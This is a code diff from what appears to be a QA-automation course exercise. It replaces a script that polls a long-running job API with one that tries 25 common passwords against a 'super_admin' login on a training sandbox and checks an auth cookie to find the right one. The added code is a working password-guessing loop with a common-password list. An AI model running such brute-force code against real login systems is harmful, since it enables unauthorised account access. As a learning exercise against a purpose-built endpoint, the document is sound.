@@ -1,33 +1,14 @@
 import requests
-import json
-import time
 
-response = requests.get("https://playground.learnqa.ru/ajax/api/longtime_job")
-
-print(response.text)
-
-token = json.loads(response.text)["token"]
-seconds = json.loads(response.text)["seconds"]
-print("token is :", token)
-print("sleep for ", seconds-2, " seconds")
-
-time.sleep(seconds-2)
-
-response = requests.get("https://playground.learnqa.ru/ajax/api/longtime_job", params={"token": token})
-
-print(response.text)
-if json.loads(response.text)["status"] == "Job is NOT ready":
-    print("OK")
-else:
-    print("Error")
-
-print("sleep for another two seconds")
-time.sleep(2)
-
-response = requests.get("https://playground.learnqa.ru/ajax/api/longtime_job", params={"token": token})
-
-print(response.text)
-if (json.loads(response.text)["status"] == "Job is ready") & ("result" in json.loads(response.text)):
-    print("OK")
-else:
-    print("Error")
+passwords = ["123456", "123456789", "qwerty", "password", "1234567", "12345678", "12345", "iloveyou", "111111",
+             "123123", "abc123", "qwerty123", "1q2w3e4r", "admin", "qwertyuiop", "654321", "555555", "lovely",
+             "7777777", "welcome", "888888", "princess", "dragon", "password1", "123qwe"]
+for i in range(len(passwords)):
+    response = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework",
+                             params={"login": "super_admin", "password": passwords[i]})
+    cookies = response.cookies
+    response = requests.get("https://playground.learnqa.ru/ajax/api/check_auth_cookie", cookies=cookies)
+    if response.text == "You are authorized":
+        print(response.text)
+        print("Correct password is", passwords[i])
+        break
